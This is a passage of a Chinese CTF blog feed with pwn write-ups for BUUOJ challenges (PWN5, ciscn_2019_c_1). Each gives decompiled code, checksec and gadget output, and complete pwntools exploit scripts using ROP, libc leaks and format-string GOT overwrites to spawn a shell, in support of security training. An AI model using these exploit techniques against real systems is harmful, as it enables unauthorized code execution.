class="number">231</span>]; <span class="comment">// [esp+11h] [ebp-E7h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">127</span> )</span><br><span class="line">    result = read(<span class="number">0</span>, buf, <span class="number">0xC8</span>u);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = read(<span class="number">0</span>, buf, a1);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上述代码可以发现，如果使得a1的值不等于127，就可以任意控制read接受字符串的长度，那就可以利用栈溢出，同时没有找到后门函数，需要自己构造rop。</p><p>整理一下思路，大致为：</p><ol><li>输入字符串，第一个字符是<code>\x00</code>绕过和随机数的比较</li><li>控制buf[7]的值，完成栈溢出</li><li>泄露write的地址，计算出system函数和/bin/sh的地址</li><li>重新运行一遍<code>main</code>函数，再次栈溢出，调用system(‘/bin/sh’)</li></ol><p>从上述思路可以整理出脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">host = <span class="string">&#x27;node3.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">25562</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="keyword">if</span> is_debug:</span><br><span class="line">sh = process(file_name)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">sh = remote(host, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x8048825</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write address disclosure</span></span><br><span class="line">payload1 = <span class="string">&#x27;\x00&#x27;</span> + <span class="string">&#x27;\xff&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xeb</span> + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>) + p32(main_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload1)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Correct\n&#x27;</span>, payload2)</span><br><span class="line">write_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># system&amp;/bin/sh</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">payload3 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xeb</span> + p32(sys_addr) + p32(sys_addr) + p32(bin_sh_addr)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Correct\n&#x27;</span>, payload3)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;checksec结果：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/sp</summary>
      
    
    
    
    <category term="buuoj" scheme="https://www.ruomo.fun/categories/buuoj/"/>
    
    
    <category term="buuoj" scheme="https://www.ruomo.fun/tags/buuoj/"/>
    
    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【第五空间2019决赛】PWN5</title>
    <link href="https://www.ruomo.fun/2021/06/18/buuoj/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9BPWN5/"/>
    <id>https://www.ruomo.fun/2021/06/18/buuoj/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9BPWN5/</id>
    <published>2021-06-18T05:42:49.730Z</published>
    <updated>2021-06-18T06:02:34.287Z</updated>
    
    <content type="html"><![CDATA[<p>checksec结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ checksec --file=pwn           </span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols        No    0               2               pwn</span><br></pre></td></tr></table></figure><p>拖入ida分析，<code>main</code>源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [esp+0h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">char</span> nptr[<span class="number">16</span>]; <span class="comment">// [esp+4h] [ebp-80h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+14h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;a1;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v1);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, &amp;dword_804C044, <span class="number">4u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x63</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello,&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your passwd:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, nptr, <span class="number">0xF</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(nptr) == dword_804C044 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok!!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readgsdword(<span class="number">0x14</span>u) != v6 )</span><br><span class="line">    sub_80493D0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据源码可知程序流程如下：</p><ol><li>输入名字</li><li>输出’Hello,'加输入的名字</li><li>输入密码</li><li>将输入密码和随机生成的4位密码比较，正确就执行system(‘/bin/sh’)，错误就提示错误</li></ol><p>观察2个可输入的点，读入长度都没有超过可接收的长度，因此无法直接栈溢出。</p><p>观察到名字输出部分代码<code>printf(buf)</code>，存在格式化字符串漏洞。</p><p>测试一下，看看偏移</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ ./pwn           </span><br><span class="line">your name:aaaa--%p--%p--%p--%p--%p--%p--%p--%p--%p--%p--%p--%p--%p--%p</span><br><span class="line">Hello,aaaa--0xffa5a3e8--0x63--(nil)--0xf7f4dae0--0x3--0xf7f1a410--0x1--(nil)--0x1--0x61616161--0x70252d2d--0x70252d2d--0x70252d2d--0x70252d2d</span><br><span class="line">2��your passwd:123</span><br><span class="line">fail</span><br></pre></td></tr></table></figure><p>可以看到第10个%p处的输出结果是<code>0x61616161</code>，得到偏移量是10。</p><p>接下来存在有2种方法可以获取权限：</p><ol start="2"><li>用fmtstr_payload改写atoi地址，将其改为system地址</li><li>用fmtstr_payload改写随机的数据</li></ol><p>这两种方式的脚本依次如下：</p><p>exp1：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">host = <span class="string">&#x27;node3.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">26031</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="keyword">if</span> is_debug:</span><br><span class="line">sh = process(file_name)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">sh = remote(host, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=fmtstr_payload(<span class="number">10</span>, &#123;atoi_got: system_plt&#125;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>exp2：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">0</span></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">host = <span class="string">&#x27;node3.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">26031</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="keyword">if</span> is_debug:</span><br><span class="line">sh = process(file_name)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">sh = remote(host, port)</span><br><span class="line"></span><br><span class="line">dword_804C044 = <span class="number">0x804C044</span></span><br><span class="line"></span><br><span class="line">payload=fmtstr_payload(<span class="number">10</span>, &#123;dword_804C044: <span class="number">0x1111</span>&#125;)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;your name&#x27;</span>, payload)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;your passwd&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x1111</span>))</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;checksec结果：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/sp</summary>
      
    
    
    
    <category term="buuoj" scheme="https://www.ruomo.fun/categories/buuoj/"/>
    
    
    <category term="buuoj" scheme="https://www.ruomo.fun/tags/buuoj/"/>
    
    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ciscn_2019_c_1</title>
    <link href="https://www.ruomo.fun/2021/06/18/buuoj/ciscn_2019_c_1/"/>
    <id>https://www.ruomo.fun/2021/06/18/buuoj/ciscn_2019_c_1/</id>
    <published>2021-06-18T03:36:10.729Z</published>
    <updated>2021-06-21T04:41:45.425Z</updated>
    
    <content type="html"><![CDATA[<p>checksec结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   85) Symbols       No    0               1               ciscn_2019_c_1</span><br></pre></td></tr></table></figure><p>拖入ida64分析，<code>main</code>函数没有什么价值，就是判断输入内容，1就调用<code>encrypt</code>函数；2就让你自己解密，他不管；3就结束。</p><p>唯一可以看的就一个加密函数，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">encrypt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your Plaintext to be encrypted&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)x;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(s) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[x] &lt;= <span class="number">96</span> || s[x] &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( s[x] &lt;= <span class="number">64</span> || s[x] &gt; <span class="number">90</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( s[x] &gt; <span class="number">47</span> &amp;&amp; s[x] &lt;= <span class="number">57</span> )</span><br><span class="line">          s[x] ^= <span class="number">0xF</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        s[x] ^= <span class="number">0xE</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      s[x] ^= <span class="number">0xD</span>u;</span><br><span class="line">    &#125;</span><br><span class="line">    ++x;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ciphertext&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>刚进函数，就有一个gets入眼，那么搜索一下危险函数，然而并没有任何发现。那这题就只能自己构造ROP去调用system(‘/bin/sh’)了，这里利用puts函数来计算地址。</p><p>首先用ROPgadget搜一下pop rdi ; ret和ret</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ ROPgadget --binary ./ciscn_2019_c_1 --only <span class="string">&quot;pop|ret&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c80 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c82 : pop r15 ; ret</span><br><span class="line">0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007f0 : pop rbp ; ret</span><br><span class="line">0x0000000000400aec : pop rbx ; pop rbp ; ret</span><br><span class="line">0x0000000000400c83 : pop rdi ; ret</span><br><span class="line">0x0000000000400c81 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006b9 : ret</span><br><span class="line">0x00000000004008ca : ret 0x2017</span><br><span class="line">0x0000000000400962 : ret 0x458b</span><br><span class="line">0x00000000004009c5 : ret 0xbf02</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 15</span><br><span class="line">                                                                                                                                                   </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ ROPgadget --binary ./ciscn_2019_c_1 --only <span class="string">&quot;ret&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000004006b9 : ret</span><br><span class="line">0x00000000004008ca : ret 0x2017</span><br><span class="line">0x0000000000400962 : ret 0x458b</span><br><span class="line">0x00000000004009c5 : ret 0xbf02</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 4</span><br></pre></td></tr></table></figure><p>找到pop rdi ; ret地址<code>0x400c83</code>，ret地址<code>0x4006b9</code>。</p><p>首先需要泄露出puts函数的地址，这样才能算出system函数和字符串/bin/sh的地址。为了节省时间，第一个字符用<code>\x00</code>来绕过strlen以此来跳过循环加密。因为后面还需要调用<code>system('/bin/sh')</code>，因此还需要再执行一次main函数。</p><p>根据以上条件构造出第一个payload：<code>payload1 = b'\x00' + b'a' * 0x57 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(_start_addr)</code></p><p>先用这部分看看输出情况，写出如下脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line">file_name = <span class="string">&#x27;./ciscn_2019_c_1&#x27;</span></span><br><span class="line">host = <span class="string">&#x27;node3.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">25980</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="keyword">if</span> is_debug:</span><br><span class="line">sh = process(file_name)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">sh = remote(host, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">_start_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x57</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(_start_addr)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload1)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ python3 exp.py                                                                                                                             1 ⨯</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>: pid 3461</span><br><span class="line">[*] <span class="string">&#x27;/home/kali/Desktop/ciscn_2019_c_1&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">4196064</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Ciphertext</span><br><span class="line"></span><br><span class="line">\xf0\x85j\xe0\x7f</span><br><span class="line">EEEEEEE                            hh      iii                </span><br><span class="line">EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  </span><br><span class="line">EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e </span><br><span class="line">EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  </span><br><span class="line">EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee </span><br><span class="line">====================================================================</span><br><span class="line">Welcome to this Encryption machine</span><br><span class="line"></span><br><span class="line">====================================================================</span><br><span class="line">1.Encrypt</span><br><span class="line">2.Decrypt</span><br><span class="line">3.Exit</span><br><span class="line">Input your choice!</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>从上面可以看到puts函数的地址被泄露出来了，接下来就是用LibcSearcher来搜索puts的在libc中的地址，然后计算偏移量，再用system和/bin/sh在libc中的地址加上偏移量得到真实地址。然后再溢出调用system(‘/bin/sh’)。</p><p>最终脚本如下：</p><blockquote><p>ps: 这边不知道为什么，我本地libc用2.31的EOF，然后我指定用2.27直接EOF，输入都不给输入。。但是buu的服务器上面上去让我选又得选那个2.27的才能正常通过……迷惑。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 